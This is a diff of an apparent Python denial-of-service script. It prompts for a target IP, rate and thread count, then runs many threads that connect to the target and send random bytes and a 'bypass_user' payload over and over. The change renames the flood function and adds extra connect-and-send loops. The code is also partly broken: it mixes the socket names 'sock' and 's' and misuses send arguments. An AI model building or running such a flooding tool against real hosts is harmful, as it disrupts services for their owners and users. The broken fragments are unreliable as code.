@@ -40,7 +40,7 @@ times = int(input("Times/s => "))
 th = int(input("Thread/t => "))
 host = socket.gethostbyname(ip)
 os.system('cls' if os.name == 'nt' else 'clear')
-def spoof():
+def start():
     global byte1, byte2, pack, pack2, msg
     global useragents, ref, acceptall
     byte1 = random._urandom(1024)
@@ -57,14 +57,17 @@ def spoof():
               pack = random._urandom(1000)
               packw = random._urandom(1444)
               msg = Attack[random.randrange(0,3)]
-              sock.connect((ip, port))
-              sock.send(ip, port)
-              sock.send(ip, port)
-              sock.send(ip, port)
+              s.connect((str(ip),int(port)))
+              s.send(str.encode(bypass_user))
+              s.send(str.encode(bypass_user))
+              s.send(str.encode(bypass_user))
+              for _ in range(th):
+                  s.connect((str(ip),int(port)))
+                  s.send(str.encode(bypass_user))
           except:
               sock.close()
     
 for y in range(th):
-    thred = threading.Thread(target=spoof)
+    thred = threading.Thread(target=start)
     thred.start()
      
